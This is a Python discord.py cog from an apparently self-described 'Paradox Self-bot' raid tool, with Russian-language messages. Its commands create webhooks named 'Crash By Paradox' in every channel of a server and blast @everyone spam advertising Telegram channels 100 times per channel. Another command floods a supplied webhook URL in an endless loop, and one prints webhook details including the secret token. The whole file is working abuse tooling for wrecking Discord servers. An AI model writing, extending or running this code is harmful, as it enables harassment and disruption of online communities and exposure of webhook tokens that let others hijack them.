import os

try:
    import discord
except: os.system('pip install discord')

from discord.ext import commands

try:
    import colorama
except: os.system('pip install colorama')

from colorama import Fore, init

try:
    import requests
except: os.system('pip install requests')

try:
    import asyncio
except:
    os.system('pip install asyncio')

init()

class webhooks(commands.Cog):
    def __init__(self, client):
        self.client = client

    async def spam_hook(self, ctx, web):
        for i in range(100):
            await web.send("""
@everyone / @here
Сервер крашится by Paradox Self-bot
С любовью, Paradox
https://t.me/paradox_gamesyt
https://t.me/deadons
""")

    async def create_hook(self, ctx, chn):
        try:
            webhook = await chn.create_webhook(name='Crash By Paradox')
        except:
            pass 
        else:
            asyncio.create_task(webhooks.spam_hook(self, ctx, web=webhook))
  
    @commands.command()
    async def webhook_send(self, ctx, url=None, *, arg=None):
        await ctx.message.delete()
        if url == None or arg == None:
            await ctx.send('**Ты не указал url вебхука или текст**')
        else:
            try:
                requests.post(url, json={"content": arg})
                await ctx.send('**Sucefully** :white_check_mark:')
            except: await ctx.send('**Invalid webhook**')
            
    @commands.command()
    async def webhook_spam(self, ctx, url=None, *, arg='''
@everyone / @here
Сервер крашится by Paradox Self-bot
С любовью, Paradox
https://t.me/paradox_gamesyt
https://t.me/deadons
'''):
        if url == None:
            await ctx.send('**Ты не указал url вебхука**')
        else:
            await ctx.send('**Начат спам на вебхук**')
            while True:
                try:
                    requests.post(url, json={"content": arg})
                except: pass
            
    @commands.command()
    async def hookall(self, ctx):
        await ctx.message.delete()
        for channel in ctx.guild.channels:
            try:
                await channel.create_webhook(name='Crash By Paradox')
            except: pass
                
        for _ in range(100):
            for chn in ctx.guild.text_channels:
                for web in await chn.webhooks():
                    try:
                        await web.send('''
@everyone / @here
Сервер крашится by Paradox Self-bot
С любовью, Paradox
https://t.me/paradox_gamesyt
https://t.me/deadons
''')
                    except: pass

    @commands.command()
    async def hookspam2(self, ctx):
        for channel in ctx.guild.text_channels:
            asyncio.create_task(webhooks.create_hook(self, ctx, chn=channel))

    @commands.command()
    async def webhook_info(self, ctx, url=None):
        if url == None:
            await ctx.send('**Ты не указал url вебхука**')
        else:
            m = requests.get(url)
            if m.status_code == 404:
                await ctx.send('Вебхук не валид')
            else:
                name = m.json()["name"]
                idd = m.json()["id"]
                avatar = m.json()["avatar"]
                if avatar == None:
                    avatar = 'Нету'
                chann_id = m.json()["channel_id"]
                guild_id = m.json()["guild_id"]
                token = m.json()["token"]
                info = f'''
> 📑 〢**Инфо о вебхуке:**
> ├ 🔗・**Url вебхука:** `{url}`
> ├ ™️・**Название вебхука:** `{name}`
> ├ 🆔・**ID вебхука:** `{idd}`
> ├ 🖼️・**Аватар вебхука:** `{avatar}`
> ├ 🆔・**ID сервера:** `{guild_id}`
> ├ 🆔・**ID канала:** `{chann_id}`
> └ 🔑・**Токен вебхука:** `{token}`
'''
                await ctx.send(info)

                        
def setup(client):
    client.add_cog(webhooks(client))